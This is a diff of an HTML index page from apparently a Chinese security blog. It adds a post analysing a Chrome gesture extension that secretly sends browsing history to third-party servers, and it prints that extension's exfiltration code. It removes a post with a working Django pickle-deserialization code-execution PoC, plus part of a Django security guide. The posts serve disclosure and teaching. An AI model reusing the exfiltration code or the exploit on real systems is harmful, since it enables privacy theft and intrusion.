@@ -334,6 +334,185 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2016/05/01/小心浏览器插件窃取你的隐私/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/05/01/小心浏览器插件窃取你的隐私/" itemprop="url">
+                  小心浏览器插件窃取你的隐私
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-01T15:38:36+08:00">
+                2016-05-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Burpsuite/" itemprop="url" rel="index">
+                    <span itemprop="name">Burpsuite</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2016/05/01/小心浏览器插件窃取你的隐私/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2016/05/01/小心浏览器插件窃取你的隐私/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2016/05/01/小心浏览器插件窃取你的隐私/" class="leancloud_visitors" data-flag-title="小心浏览器插件窃取你的隐私">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>浏览器插件已经成为了浏览器的必备品，但是市场上的插件也良莠不齐，甚至部分插件切换用户隐私，如浏览器的历史记录。笔者就遇到了这样一个插件，就是著名的手势插件：crxMouse Chrome Gestures，更可气的是已经用了这个插件一年多了。</p>
+<p>#1 简单介绍：<br>用Google搜索crxMouse Chrome Gestures导向到google市场，可以看到这款插件的简单介绍。<br>原名:Gestures for Chrome(TM)汉化版.方便,快捷,充分发掘鼠标的所有操作.功能包括:鼠标手势,超级拖曳,滚轮手势,摇杆手势,平滑滚动,标签页列表等.<br>本扩展致力于通过鼠标来实现一些功能操作,充分挖掘鼠标的所有操作.<br>功能包括:鼠标手势,超级拖曳,滚轮手势,摇杆手势,平滑滚动,标签页列表等<br>目前在google市场上这款插件有30万的用户，累计评价5000，其中很大一部分是国内用户，影响还是非常广泛的。<img src="http://104.251.228.50/pic/crxmouse_google.png" alt="google市场"></p>
+<p>#2 验证窃取行为<br>通过wireshark抓包可以看到两个分别发送到s808.searchelper.com和s1808.searchelper.com的请求，直接上图：<img src="http://104.251.228.50/pic/related.png" alt="s808服务请求"></p>
+<p>  从origin可以看出，请求是来源于浏览器插件，标记为：jgiplclhploodgnkcljjgddajfbmafmp，可以通过chrome的chrome://extensions/找到该id对应的插件，就是<img src="http://104.251.228.50/pic/crxmouse.png" alt="插件显示">，其对应的系统目录为<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Users\[用户]\AppData\Local\Google\Chrome\User Data\Default\Extensions\jgiplclhploodgnkcljjgddajfbmafmp</div><div class="line">  ```，我们可以通过分析其代码发现其实现，这个后续再讲。细心的读者可能会看到post请求段被加密了，看结构像是base64，尝试用base64解码，还是base64编码格式，再次解码，得到如下数据：</div></pre></td></tr></table></figure></p>
+<p>s=808&amp;md=21&amp;pid=SjOa3PgqWSHYapU&amp;sess=314039255259558500&amp;q=<a href="http://bbs.pediy.com/showthread.php?t=179524&amp;prev=http://bbs.pediy.com/forumdisplay.php?f=161&amp;link=1&amp;sub=chrome&amp;hreferer=http://bbs.pediy.com/forumdisplay.php?f=161&amp;tmv=3015" target="_blank" rel="external">http://bbs.pediy.com/showthread.php?t=179524&amp;prev=http://bbs.pediy.com/forumdisplay.php?f=161&amp;link=1&amp;sub=chrome&amp;hreferer=http://bbs.pediy.com/forumdisplay.php?f=161&amp;tmv=3015</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">s=808就代表着服务器s808,pid即userid，sess是用户本地标记session，sub代表着浏览器类型，q代表当前页面，prev代表着从哪个页面过来，也就是referer的作用，hreferer就也记录着referer字段有了这些数据就可以分析用户行为，可以供搜索引擎，其实百度统计和google统计也是干同样的事，甚至百度统计还有点击等的统计。就这样你的浏览行为被发送给了其他服务器，这不是最危险的，最危险的是你在浏览内网的一些页面也会被发送出去，内网的一些站点就很容易被泄露了。</div><div class="line">  接着我们看另外一个请求，这个请求是发送到s1808服务器上，具体请求如下：![s1808服务器的请求][4]，解密加密后的内容和发送到s808的请求基本一致，具体如下：</div></pre></td></tr></table></figure></p>
+<p>s=1808&amp;md=21&amp;pid=SjOa3PgqWSHYapU&amp;sess=765877789119258500&amp;sub=chrome&amp;q=http%3A//bbs.pediy.com/showthread.php%3Ft%3D179524&amp;hreferer=http%3A//bbs.pediy.com/forumdisplay.php%3Ff%3D161&amp;prev=http%3A//bbs.pediy.com/forumdisplay.php%3Ff%3D161&amp;tmv=4015&amp;tmf=1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">这里就有点搞不太清楚发这样一个备份请求的原因了，难道仅仅是备份，有待思考，为了更好的弄清楚该插件还有没有其他危险行为，接下来我们分析插件的实现。</div><div class="line"></div><div class="line">#3 恶意插件实现</div><div class="line">插件的恶意行为集中在upalytics_ch.js代码中，安装后的初始化代码：</div><div class="line">```js</div><div class="line">this.initOnceAfterInstall = function() &#123;</div><div class="line">    if (!utils.db.get(&quot;userid&quot;)) &#123;</div><div class="line">        var id = utils.createUserID();</div><div class="line">        utils.db.set(&quot;userid&quot;, id)</div><div class="line">    &#125;</div><div class="line">    if (!utils.db.get(&quot;install_time&quot;)) &#123;</div><div class="line">        var now = (new Date).getTime() / 1E3;</div><div class="line">        utils.db.set(&quot;install_time&quot;, now)</div><div class="line">    &#125;</div><div class="line">    if (!utils.db_type.get(&quot;tmv&quot;)) &#123;</div><div class="line">        var now = (new Date).getTime() / 1E3;</div><div class="line">        utils.db_type.set(&quot;tmv&quot;, SIM_ModuleConstants._TMV);</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>在初始化中生成userid，获取install_time，twv字段存放在本地localstorage中，接着会创建各种调用addListener接口来创建监听器，当tab页更新，替换，激活的时候就会调用相应的请求发送相应的函数，extension_onRequest则是发送到s808服务器，tabs_onUpdated,tabs_onActivated,tabs_onReplaced则是发送请求到s1808服务器，具体代码如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.start = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        chrome.extension.onRequest.addListener(extension_onRequest);</div><div class="line">        chrome.tabs.onUpdated.addListener(tabs_onUpdated);</div><div class="line">        chrome.tabs.onActivated.addListener(tabs_onActivated);</div><div class="line">        chrome.tabs.onReplaced.addListener(tabs_onReplaced)</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">        log.SEVERE(<span class="string">"8835"</span>, e)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>下面我们简单分析下发送到s808.searchelper.com的related请求的代码，已简化，简化部分主要是去除一些google搜索的跳转，去除docType非html类型的，去除间隔时间很短的。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">extension_onRequest</span>(<span class="params">request, sender, sendResponse</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> prev_state = tabs_states[tabId];</div><div class="line">    tabs_states[tabId] = change_status;</div><div class="line">    <span class="keyword">if</span> (res_prev_url == tab_url &amp;&amp; prev_state != change_status)&#123;</div><div class="line">	    log.ERROR(<span class="string">"ERROR 8002 ??"</span>);</div><div class="line">	    <span class="keyword">return</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(res_prev_url == <span class="literal">null</span> || res_prev_url.length == <span class="number">0</span>) &#123;</div><div class="line">	    res_prev_url = last_prev;</div><div class="line">    &#125;</div><div class="line">    last_prev = tab_url;</div><div class="line">    <span class="keyword">var</span> data = <span class="string">"s="</span> + SIM_Config_BG.getSourceId() + <span class="string">"&amp;md=21&amp;pid="</span> + utils.db.get(<span class="string">"userid"</span>) + <span class="string">"&amp;sess="</span> + SIM_Session.getSessionId() + <span class="string">"&amp;q="</span> + <span class="built_in">encodeURIComponent</span>(tab_url) + <span class="string">"&amp;prev="</span> + <span class="built_in">encodeURIComponent</span>(res_prev_url) + <span class="string">"&amp;link="</span> + (ref ? <span class="string">"1"</span> : <span class="string">"0"</span>) + <span class="string">"&amp;sub="</span> + SIM_ModuleConstants.BROWSER + <span class="string">"&amp;hreferer="</span> + <span class="built_in">encodeURIComponent</span>(ref);</div><div class="line">    data = data + <span class="string">"&amp;tmv="</span> + SIM_ModuleConstants._TMV;</div><div class="line">    data = SIM_Base64.encode(SIM_Base64.encode(data));</div><div class="line">    data = <span class="string">"e="</span> + data;</div><div class="line">    <span class="keyword">var</span> url = utils.db_type.get(<span class="string">"server"</span>) + <span class="string">"/related"</span>;</div><div class="line"></div><div class="line">    utils.net.post(url, <span class="string">"json"</span>, data, <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</div><div class="line">			log.INFO(<span class="string">"Succeeded in posting data"</span>);</div><div class="line">			tabs_prevs[tabId] = tab_url</div><div class="line">			&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">httpCode</span>) </span>&#123;</div><div class="line">			log.INFO(<span class="string">"Failed to retrieve content. (HTTP Code:"</span> + httpCode.status + <span class="string">")"</span>);</div><div class="line">			log.ERROR(<span class="string">"ERROR 8004 ??"</span>);</div><div class="line">			tabs_prevs[tabId] = tab_url</div><div class="line">			&#125;)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>从上述代码中可以看出在关键的浏览器当前url和referer都进行了两次base64编码处理，可以逃过一些普通用户的眼睛，难道这种方式能够躲过google的一些自动审查，比较好奇。</p>
+<p>#4 建议<br>码农也不容易，辛辛苦苦写出来的程序不赚钱只能靠窃取用户浏览历史发给第三方来获取回报，想必也是迫不得已，当然对于这种窃取隐私的绝对要抵制。mouse guesture作为一个很好用的特性，笔者已经难以离开，所以在google市场上选择了其他的guesture插件。有了这个教训，相信大家以后使用浏览器插件肯定会多长一双眼睛。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2016/04/01/基于mezzanine的攻防比赛环境搭建及XXE漏洞构造/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1608,364 +1787,6 @@ Linux
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2015/04/01/从Django的SECTET_KEY到代码执行/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015/04/01/从Django的SECTET_KEY到代码执行/" itemprop="url">
-                  从Django的SECTET_KEY到代码执行
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-04-01T15:38:36+08:00">
-                2015-04-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index">
-                    <span itemprop="name">Python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2015/04/01/从Django的SECTET_KEY到代码执行/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2015/04/01/从Django的SECTET_KEY到代码执行/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2015/04/01/从Django的SECTET_KEY到代码执行/" class="leancloud_visitors" data-flag-title="从Django的SECTET_KEY到代码执行">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>最近审查代码发现某些产品在登录的JS代码中泄露了SECRET_KEY,将该值作为密码加密的盐，这样就暴露了加密salt不太好吧，更重要的是对django的安全造成了极大的威胁。</p>
-<h1 id="2-SECRET-KEY作用"><a href="#2-SECRET-KEY作用" class="headerlink" title="2 SECRET_KEY作用"></a>2 SECRET_KEY作用</h1><p>SECTET_KEY在djanog中使用非常广泛，基本上涉及到安全，加密等的地方都用到了，下面列举一些常见情景：<br>1，json object的签名<br>2，加密函数，如密码重置，表单，评论，csrf的key，session数据</p>
-<p>这里面就要重点讲到session的问题，在这里使用不当就会导致代码执行</p>
-<h1 id="3-代码执行"><a href="#3-代码执行" class="headerlink" title="3 代码执行"></a>3 代码执行</h1><h2 id="3-1-settings的session设置"><a href="#3-1-settings的session设置" class="headerlink" title="3.1 settings的session设置"></a>3.1 settings的session设置</h2><p>django默认存储session到数据库中，但是可能会比较慢，就会使用到缓存，文件，还有cookie等方式，如果采用了cookie机制则有可能代码执行，settings配置如下：<br><code>SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39;</code></p>
-<h2 id="3-2-django-1-6以下"><a href="#3-2-django-1-6以下" class="headerlink" title="3.2 django 1.6以下"></a>3.2 django 1.6以下</h2><p>在django1.6以下，session默认是采用pickle执行序列号操作，在1.6及以上版本默认采用json序列化。代码执行只存在于使用pickle序列话的操作中。</p>
-<h2 id="3-3-session处理流程"><a href="#3-3-session处理流程" class="headerlink" title="3.3 session处理流程"></a>3.3 session处理流程</h2><p>可以简单的分为两部分，process_request和process_response,前者负责选择session引擎，初始化cookie数据。见代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionMiddleware</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request)</span>:</span></div><div class="line">        engine = import_module(settings.SESSION_ENGINE)</div><div class="line">        session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, <span class="keyword">None</span>)</div><div class="line">        request.session = engine.SessionStore(session_key)</div></pre></td></tr></table></figure></p>
-<p>process_response则是处理返回给用户的cookie信息，比如修改过期时间等。在将session存入缓存后，可能在某个操作中会用到session信息，这个时候就会通过反序列化操作从缓存中取，如果反序列话引擎是采用pickle机制的话就存在代码执行。反序列化的代码位于django.core.signing.py中，这个模块主要是一些签名，加解密操作，同时也包含序列化和反序列化，默认采用JSON引擎，下面是反序列话loads的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s, key=None, salt=<span class="string">'django.core.signing'</span>, serializer=JSONSerializer, max_age=None)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    Reverse of dumps(), raises BadSignature if signature fails</div><div class="line">    """</div><div class="line">    base64d = smart_str(</div><div class="line">        TimestampSigner(key, salt=salt).unsign(s, max_age=max_age))</div><div class="line">    decompress = <span class="keyword">False</span></div><div class="line">    <span class="keyword">if</span> base64d[<span class="number">0</span>] == <span class="string">'.'</span>:</div><div class="line">        <span class="comment"># It's compressed; uncompress it first</span></div><div class="line">        base64d = base64d[<span class="number">1</span>:]</div><div class="line">        decompress = <span class="keyword">True</span></div><div class="line">    data = b64_decode(base64d)</div><div class="line">    <span class="keyword">if</span> decompress:</div><div class="line">        data = zlib.decompress(data)</div><div class="line">    <span class="keyword">return</span> serializer().loads(data)</div></pre></td></tr></table></figure></p>
-<h2 id="3-4-构造POC"><a href="#3-4-构造POC" class="headerlink" title="3.4 构造POC"></a>3.4 构造POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line">os.environ.setdefault(<span class="string">'DJANGO_SETTINGS_MODULE'</span>,<span class="string">'settings'</span>)</div><div class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</div><div class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</div><div class="line"><span class="keyword">from</span> django.contrib.sessions.backends <span class="keyword">import</span> signed_cookies</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Run</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'touch /tmp/xxlegend.log'</span>,))</div><div class="line"></div><div class="line">sess = signing.dumps(Run(), serializer=signed_cookies.PickleSerializer,salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span>)</div><div class="line"><span class="keyword">print</span> sess</div><div class="line"></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> cookielib</div><div class="line"></div><div class="line">url = <span class="string">'http://10.24.35.228:8000/favicon.ico'</span></div><div class="line">headers = &#123;<span class="string">'Cookie'</span>:<span class="string">'sessionid="%s"'</span> %(sess)&#125;</div><div class="line">request = urllib2.Request(url,headers = headers)</div><div class="line">response = urllib2.urlopen(request)</div><div class="line"><span class="keyword">print</span> response.read()</div></pre></td></tr></table></figure>
-<p>通过序列化Run类，实现创建一个文件的操作，在反序列化的时候执行这个操作。执行代码完成可看到在/tmp目录创建xxlegend.log文件，同时web报500错误。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>利用条件总结起来就是这么几句话，首先泄露了SECRET_KEY,其次session引擎采用了signed_cookies,django版本小于1.6即存在代码执行问题。同样的问题也存在于python的其他web框架中，如flask，bottle。</p>
-<p><a href="https://github.com/danghvu/pwp/blob/master/exploit.py" target="_blank" rel="external">https://github.com/danghvu/pwp/blob/master/exploit.py</a><br><a href="https://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.html" target="_blank" rel="external">https://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.html</a><br><a href="https://systemoverlord.com/blog/2014/04/14/plaidctf-2014-reekeeeee/" target="_blank" rel="external">https://systemoverlord.com/blog/2014/04/14/plaidctf-2014-reekeeeee/</a><br><a href="http://www.shysecurity.com/post/Reekee" target="_blank" rel="external">http://www.shysecurity.com/post/Reekee</a><br><a href="http://python.usyiyi.cn/django/topics/http/sessions.html" target="_blank" rel="external">http://python.usyiyi.cn/django/topics/http/sessions.html</a><br><a href="https://github.com/django/django/blob/stable/1.5.x/django/core/signing.py" target="_blank" rel="external">https://github.com/django/django/blob/stable/1.5.x/django/core/signing.py</a><br><a href="http://stackoverflow.com/questions/15170637/effects-of-changing-djangos-secret-key/15383766?noredirect=1#comment21743494_15383766" target="_blank" rel="external">http://stackoverflow.com/questions/15170637/effects-of-changing-djangos-secret-key/15383766?noredirect=1#comment21743494_15383766</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2015/04/01/Django安全机制/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015/04/01/Django安全机制/" itemprop="url">
-                  Django安全机制
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-04-01T15:38:36+08:00">
-                2015-04-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Django/" itemprop="url" rel="index">
-                    <span itemprop="name">Django</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2015/04/01/Django安全机制/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2015/04/01/Django安全机制/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2015/04/01/Django安全机制/" class="leancloud_visitors" data-flag-title="Django安全机制">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>#1 xss<br>django 已经能防范95%的xss问题，主要原理就是将&lt;,&gt;,&amp;做了转化，但是如下情况还是无能为力<br>（1）属性有动态内容，正确：<code>&lt;img alt=&quot;{{good}}&quot;&gt;</code>,错误：<code>&lt;img alt={{bad}}&gt;</code>,请确保加上双引号。<br>（2）插入到CSS中的数据(style 标签和属性),以及javascript(script标签,事件处理器,onclick等其他属性),在这些标签内请手动escape.<br>（3）还有就是使用了mark_safe跳过了template默认机制或者autoescape关闭了。<br>（4）涉及到dom类型的xss，如document.write等<br>（5）HttpResponse返回动态内容<br>另外注意属性中包含url(href,img src)时验证url协议在白名单内(如http,https,mailto,ftp)</p>
-<p>#2 csrf<br>1，确保django.middleware.csrf.CsrfViewMiddleware已经开启 在settings.py中，默认是存在的。<br>2，在所有的post表单中中添加了csrf_token，如<form action="." method="post">{% csrf_token %}<br>3，在相应的view函数中，使用了django.template.context_processors.csrf，用法有两种，一个是RequestContext,另外就是手工引入,如下是手工引入:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render_to_response</div><div class="line"><span class="keyword">from</span> django.template.context_processors <span class="keyword">import</span> csrf</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_view</span><span class="params">(request)</span>:</span></div><div class="line">    c = &#123;&#125;</div><div class="line">    c.update(csrf(request))</div><div class="line">    <span class="comment"># ... view code here</span></div><div class="line">    <span class="keyword">return</span> render_to_response(<span class="string">"a_template.html"</span>, c)</div></pre></td></tr></table></figure></form></p>
-<p>@csrf_exempt装饰器是去除csrf防护,另外内置的CSRF保护机制对子域也是无能为力,比如应用在example.com,有一个子域alice.example.com放置用户可控制的内容,这个时候csrf机制是不起作用的.<br>最后注意不要使用get请求去做增删改操作,否则内置的CSRF机制也是无效的.</p>
-<p>#3 sql注入<br>直接拼接的sql会有注入风险，那如何避免呢？使用django的数据库api，会根据对应的数据库加过滤，但是有两个例外：<br>（1）extra方法中的where参数处,这个参数是故意设计成接受原始SQL；<br>extra的正确用法：<br><code>Entry.objects.extra(where=[&#39;headline=%s&#39;], params=[&#39;Lennon&#39;])</code><br>错误用法：<br><code>Entry.objects.extra(where=[&quot;headline=&#39;Lennon&#39;&quot;])</code><br>（2）直接使用低层次的数据库api，如execute，raw，可以采用cursor.execute(sql, [user])方式避免，但是部分时候是失效的，如表的位置，列的位置，这种情况下可以使用django.db.connection.ops.quote_name来自己手工加过滤<br>在有params的情况下，django会正确的转义，没有params的情况则不行。正确做法:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> connection</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span 